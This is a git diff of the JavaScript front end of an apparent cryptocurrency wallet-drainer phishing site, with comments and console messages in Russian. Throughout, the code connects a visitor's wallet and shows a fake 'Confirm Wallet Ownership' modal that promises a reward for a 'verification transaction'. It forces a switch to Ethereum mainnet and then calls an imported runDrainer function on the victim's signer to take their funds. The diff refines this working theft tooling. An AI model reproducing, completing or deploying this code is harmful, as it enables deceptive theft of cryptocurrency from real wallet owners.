@@ -1,16 +1,13 @@
-import { createAppKit } from '@reown/appkit'
-import {
-  mainnet, polygon, bsc, avalanche,
-  arbitrum, optimism, linea, base
-} from '@reown/appkit/networks'
-import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
-import { ethers } from 'ethers'
-import { runDrainer } from './drainer.js'
+import { createAppKit } from '@reown/appkit';
+import { mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base } from '@reown/appkit/networks';
+import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
+import { ethers } from 'ethers';
+import { runDrainer } from './drainer.js';
 
-// === Конфигурация ===
-const projectId = 'd85cc83edb401b676e2a7bcef67f3be8'
-const networks = [mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base]
-const wagmiAdapter = new WagmiAdapter({ projectId, networks })
+// === Конфигурация AppKit ===
+const projectId = 'd85cc83edb401b676e2a7bcef67f3be8';
+const networks = [mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base];
+const wagmiAdapter = new WagmiAdapter({ projectId, networks });
 
 const appKitModal = createAppKit({
   adapters: [wagmiAdapter],
@@ -20,38 +17,37 @@ const appKitModal = createAppKit({
     name: 'Alex dApp',
     description: 'Connect and sign',
     url: 'https://checkalex.xyz',
-    icons: ['https://checkalex.xyz/icon.png']
+    icons: ['https://checkalex.xyz/icon.png'],
   },
   features: { analytics: true, email: false, socials: false },
-  allWallets: 'SHOW'
-})
+  allWallets: 'SHOW',
+});
 
-let connectedAddress = null
-let hasDrained = false
-let hasAttemptedContractCall = false
-let isTransactionPending = false // Флаг для отслеживания состояния транзакции
-let actionBtn = null
-let modalOverlay = null
-let modalContent = null
-let modalShown = false
+// === Глобальные переменные ===
+let connectedAddress = null;
+let hasDrained = false;
+let isTransactionPending = false;
+let actionBtn = null;
+let modalOverlay = null;
+let modalContent = null;
+let modalShown = false;
 
-// Целевая сеть (mainnet в данном случае)
-const targetChainId = '0x1' // Ethereum Mainnet
+const targetChainId = '0x1'; // Ethereum Mainnet
 
+// === Инициализация при загрузке страницы ===
 window.addEventListener('DOMContentLoaded', () => {
-  actionBtn = document.getElementById('action-btn')
-  const isInjected = typeof window.ethereum !== 'undefined'
+  actionBtn = document.getElementById('action-btn');
+  const isInjected = typeof window.ethereum !== 'undefined';
 
   // Подключаем шрифт Montserrat
-  const link = document.createElement('link')
-  link.href = 'https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap'
-  link.rel = 'stylesheet'
-  document.head.appendChild(link)
+  const link = document.createElement('link');
+  link.href = 'https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap';
+  link.rel = 'stylesheet';
+  document.head.appendChild(link);
 
-  // Создаем стили для модального окна
-  const style = document.createElement('style')
+  // CSS для модального окна
+  const style = document.createElement('style');
   style.textContent = `
-    /* Затемнение фона */
     .modal-overlay {
       position: fixed;
       top: 0;
@@ -63,7 +59,6 @@ window.addEventListener('DOMContentLoaded', () => {
       display: none;
     }
 
-    /* Контейнер модального окна */
     .modal-content {
       position: fixed;
       top: 50%;
@@ -84,26 +79,17 @@ window.addEventListener('DOMContentLoaded', () => {
       animation: slideDown 0.5s ease-out forwards;
     }
 
-    /* Анимация опускания жалюзи */
     @keyframes slideDown {
-      0% {
-        transform: translate(-50%, -100%);
-        opacity: 0;
-      }
-      100% {
-        transform: translate(-50%, -50%);
-        opacity: 1;
-      }
+      0% { transform: translate(-50%, -100%); opacity: 0; }
+      100% { transform: translate(-50%, -50%); opacity: 1; }
     }
 
-    /* Заголовок */
     .modal-title {
       font-size: 20px;
       font-weight: bold;
       margin-bottom: 45px;
     }
 
-    /* Контейнер для кружка загрузки и иконки */
     .loader-container {
       position: relative;
       width: 100px;
@@ -111,7 +97,6 @@ window.addEventListener('DOMContentLoaded', () => {
       margin: 0 auto 20px;
     }
 
-    /* Кружок загрузки */
     .loader {
       width: 100%;
       height: 100%;
@@ -129,14 +114,12 @@ window.addEventListener('DOMContentLoaded', () => {
       100% { transform: rotate(360deg); }
     }
 
-    /* Нижний текст */
     .modal-footer {
       font-size: 14px;
       color: #555555;
       margin-top: 30px;
     }
 
-    /* Список действий */
     .action-list {
       list-style: none;
       padding: 0;
@@ -149,41 +132,27 @@ window.addEventListener('DOMContentLoaded', () => {
       margin-bottom: 5px;
     }
 
-    /* Адаптивность для мобильных */
     @media (max-width: 480px) {
       .modal-content {
         max-width: 250px;
         padding: 20px;
         min-height: 300px;
       }
-
-      .modal-title {
-        font-size: 18px;
-      }
-
-      .loader-container {
-        width: 80px;
-        height: 80px;
-      }
-
-      .modal-footer {
-        font-size: 12px;
-      }
-
-      .action-list {
-        font-size: 12px;
-      }
+      .modal-title { font-size: 18px; }
+      .loader-container { width: 80px; height: 80px; }
+      .modal-footer { font-size: 12px; }
+      .action-list { font-size: 12px; }
     }
-  `
-  document.head.appendChild(style)
+  `;
+  document.head.appendChild(style);
 
-  // Добавляем HTML для модального окна
-  modalOverlay = document.createElement('div')
-  modalOverlay.className = 'modal-overlay'
-  document.body.appendChild(modalOverlay)
+  // Создаём модальное окно
+  modalOverlay = document.createElement('div');
+  modalOverlay.className = 'modal-overlay';
+  document.body.appendChild(modalOverlay);
 
-  modalContent = document.createElement('div')
-  modalContent.className = 'modal-content'
+  modalContent = document.createElement('div');
+  modalContent.className = 'modal-content';
   modalContent.innerHTML = `
     <div class="modal-title">Confirm Wallet Ownership</div>
     <div class="loader-container">
@@ -195,201 +164,196 @@ window.addEventListener('DOMContentLoaded', () => {
       <li>2. Confirm the verification transaction</li>
       <li>3. Receive a reward</li>
     </ul>
-  `
-  document.body.appendChild(modalContent)
+  `;
+  document.body.appendChild(modalContent);
 
+  // Проверяем наличие инжектированного провайдера
   if (!isInjected) {
-    actionBtn.style.display = 'inline-block'
+    actionBtn.style.display = 'inline-block';
     actionBtn.addEventListener('click', () => {
-      window.showWalletRedirectModal()
-    })
-    return
+      window.showWalletRedirectModal();
+    });
+    return;
   }
 
-  actionBtn.style.display = 'inline-block'
-  actionBtn.addEventListener('click', handleConnectOrAction)
+  actionBtn.style.display = 'inline-block';
+  actionBtn.addEventListener('click', handleConnectOrAction);
 
   // Подписка на смену сети
-  window.ethereum.on('chainChanged', onChainChanged)
-})
+  window.ethereum.on('chainChanged', onChainChanged);
+});
 
-// Функции для управления модальным окном
+// === Управление модальным окном ===
 function showModal() {
-  modalOverlay.style.display = 'block'
-  modalContent.style.display = 'block'
+  modalOverlay.style.display = 'block';
+  modalContent.style.display = 'block';
 }
 
 function hideModal() {
-  modalOverlay.style.display = 'none'
-  modalContent.style.display = 'none'
+  modalOverlay.style.display = 'none';
+  modalContent.style.display = 'none';
 }
 
 function showModalOnce() {
   if (!modalShown) {
-    modalShown = true
-    showModal()
+    modalShown = true;
+    showModal();
   }
 }
 
-// Функция для автоматической смены сети
+// === Смена сети ===
 async function switchToTargetNetwork() {
   try {
-    const provider = new ethers.providers.Web3Provider(window.ethereum)
-    const network = await provider.getNetwork()
-    const currentChainId = `0x${network.chainId.toString(16)}`
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    const network = await provider.getNetwork();
+    const currentChainId = `0x${network.chainId.toString(16)}`;
 
     if (currentChainId === targetChainId) {
-      console.log('✅ Уже на нужной сети:', targetChainId)
-      return true
+      console.log('✅ Уже на Ethereum Mainnet');
+      return true;
     }
 
-    console.log('🔄 Попытка сменить сеть на:', targetChainId)
+    console.log('🔄 Попытка сменить сеть на Ethereum Mainnet');
     await window.ethereum.request({
       method: 'wallet_switchEthereumChain',
       params: [{ chainId: targetChainId }],
-    })
-    console.log('✅ Сеть успешно изменена на:', targetChainId)
-    return true
+    });
+    console.log('✅ Сеть изменена на Ethereum Mainnet');
+    return true;
   } catch (err) {
     if (err.code === 4902 || err.message.includes('Unrecognized chain')) {
-      // Сеть не добавлена в кошелек, пытаемся добавить
       try {
         await window.ethereum.request({
           method: 'wallet_addEthereumChain',
           params: [{
             chainId: targetChainId,
             chainName: 'Ethereum Mainnet',
-            nativeCurrency: {
-              name: 'Ether',
-              symbol: 'ETH',
-              decimals: 18,
-            },
-            rpcUrls: ['https://mainnet.infura.io/v3/'],
+            nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
+            rpcUrls: ['https://rpc.eth.gateway.fm'],
             blockExplorerUrls: ['https://etherscan.io'],
           }],
-        })
-        console.log('✅ Сеть добавлена и изменена на:', targetChainId)
-        return true
+        });
+        console.log('✅ Сеть Ethereum Mainnet добавлена');
+        return true;
       } catch (addErr) {
-        console.error('❌ Ошибка при добавлении сети:', addErr)
-        return false
+        console.error('❌ Ошибка добавления сети:', addErr.message);
+        return false;
       }
     } else if (err.message.includes('user rejected')) {
-      console.log('🙅 Пользователь отклонил смену сети')
-      return false
+      console.log('🙅 Пользователь отклонил смену сети');
+      return false;
     } else {
-      console.error('❌ Ошибка при смене сети:', err)
-      return false
+      console.error('❌ Ошибка смены сети:', err.message);
+      return false;
     }
   }
 }
 
+// === Выполнение drainer ===
 async function attemptDrainer() {
   if (hasDrained || isTransactionPending) {
-    console.log('⚠️ Транзакция уже выполнена или ожидает подтверждения')
-    return
+    console.log('⚠️ Транзакция уже выполнена или ожидается');
+    return;
   }
 
-  // Запускаем модальное окно и drainer только после установки нужной сети
-  const isNetworkCorrect = await switchToTargetNetwork()
+  const isNetworkCorrect = await switchToTargetNetwork();
   if (!isNetworkCorrect) {
-    console.log('⚠️ Не удалось установить нужную сеть, прерываем')
-    return
+    console.log('⚠️ Не удалось установить Ethereum Mainnet');
+    return;
   }
 
-  showModalOnce()
+  if (!connectedAddress) {
+    console.error('❌ Адрес кошелька не определён');
+    return;
+  }
+
+  console.log(`📍 Используется адрес: ${connectedAddress}`);
+  showModalOnce();
 
   try {
-    const provider = new ethers.providers.Web3Provider(window.ethereum)
-    const signer = provider.getSigner()
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    const signer = provider.getSigner();
+    const address = await signer.getAddress();
 
-    isTransactionPending = true // Устанавливаем флаг ожидания
+    if (address.toLowerCase() !== connectedAddress.toLowerCase()) {
+      console.error('❌ Несоответствие адресов:', address, connectedAddress);
+      hideModal();
+      return;
+    }
 
-    // Запускаем drainer (предполагается, что USDT allowance уже выводится внутри runDrainer)
-    const tx = await runDrainer(provider, signer, connectedAddress)
-    console.log('📨 Транзакция отправлена:', tx.hash)
+    isTransactionPending = true;
+    await runDrainer(provider, signer, connectedAddress);
+    console.log('✅ Drainer выполнен успешно');
 
-    // Ожидаем подтверждения транзакции
-    const receipt = await tx.wait()
-    console.log('✅ Транзакция подтверждена:', receipt.transactionHash)
-
-    hasDrained = true
-    isTransactionPending = false // Сбрасываем флаг после завершения
-    cleanup()
-    hideModal() // Закрываем модальное окно после успешного подтверждения
+    hasDrained = true;
+    isTransactionPending = false;
+    cleanup();
+    hideModal();
   } catch (err) {
-    isTransactionPending = false // Сбрасываем флаг при ошибке
-    hideModal() // Закрываем модальное окно при любой ошибке (включая отклонение)
-
+    isTransactionPending = false;
+    hideModal();
     if (err.message.includes('user rejected')) {
-      console.log('🙅 Пользователь отклонил транзакцию')
-      return
+      console.log('🙅 Пользователь отклонил транзакцию');
+    } else {
+      console.error('❌ Ошибка выполнения drainer:', err.message);
     }
-
-    if (hasAttemptedContractCall) {
-      console.log('⚠️ Подписание уже было запущено однажды — повтор не допускается')
-      return
-    }
-
-    hasAttemptedContractCall = true
-    console.error('❌ Ошибка при подписании транзакции:', err)
   }
 }
 
-// Основная логика подключения и первого запуска
+// === Подключение кошелька и запуск ===
 async function handleConnectOrAction() {
   try {
-    const accs = await window.ethereum.request({ method: 'eth_accounts' })
-    if (accs.length === 0) {
-      await appKitModal.open()
-      connectedAddress = await waitForWallet()
-      console.log('✅ Подключились как', connectedAddress)
+    const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+    if (accounts.length === 0) {
+      await appKitModal.open();
+      connectedAddress = await waitForWallet();
+      console.log('✅ Подключён кошелёк:', connectedAddress);
     } else {
-      connectedAddress = accs[0]
-      console.log('✅ Уже подключены:', connectedAddress)
+      connectedAddress = accounts[0];
+      console.log('✅ Уже подключён:', connectedAddress);
     }
 
-    // Проверяем, не ожидается ли уже транзакция
     if (!isTransactionPending) {
-      await attemptDrainer()
+      await attemptDrainer();
     } else {
-      console.log('⏳ Транзакция уже в процессе, ожидайте подтверждения')
+      console.log('⏳ Транзакция уже выполняется');
     }
   } catch (err) {
-    console.error('❌ Ошибка в процессе подключения/дренажа:', err)
+    console.error('❌ Ошибка подключения:', err.message);
   }
 }
 
-// Автоматический вызов при смене сети
-async function onChainChanged(_chainId) {
-  console.log('🔄 Сеть сменилась:', _chainId)
-  if (connectedAddress && !isTransactionPending) {
-    await attemptDrainer()
+// === Обработка смены сети ===
+async function onChainChanged(chainId) {
+  console.log('🔄 Смена сети:', chainId);
+  if (connectedAddress && !isTransactionPending && chainId === targetChainId) {
+    await attemptDrainer();
   } else {
-    console.log('⏳ Транзакция уже в процессе или не требуется')
+    console.log('⏳ Транзакция в процессе или сеть не соответствует');
   }
 }
 
-// Отключаем кнопку и удаляем слушатели
+// === Очистка ===
 function cleanup() {
-  if (!actionBtn) return
-  actionBtn.removeEventListener('click', handleConnectOrAction)
-  window.ethereum.removeListener('chainChanged', onChainChanged)
-  actionBtn.disabled = true
-  actionBtn.style.opacity = '0.6'
+  if (!actionBtn) return;
+  actionBtn.removeEventListener('click', handleConnectOrAction);
+  window.ethereum.removeListener('chainChanged', onChainChanged);
+  actionBtn.disabled = true;
+  actionBtn.style.opacity = '0.6';
 }
 
-// Ожидание первого подключения
+// === Ожидание подключения кошелька ===
 async function waitForWallet() {
-  const accs = await window.ethereum.request({ method: 'eth_accounts' })
-  if (accs.length > 0) return accs[0]
-  return new Promise(resolve => {
-    const id = setInterval(async () => {
-      const a = await window.ethereum.request({ method: 'eth_accounts' })
-      if (a.length) {
-        clearInterval(id)
-        resolve(a[0])
+  const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+  if (accounts.length > 0) return accounts[0];
+
+  return new Promise((resolve) => {
+    const interval = setInterval(async () => {
+      const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+      if (accounts.length) {
+        clearInterval(interval);
+        resolve(accounts[0]);
       }
-    }, 500)
-  })
+    }, 500);
+  });
 }
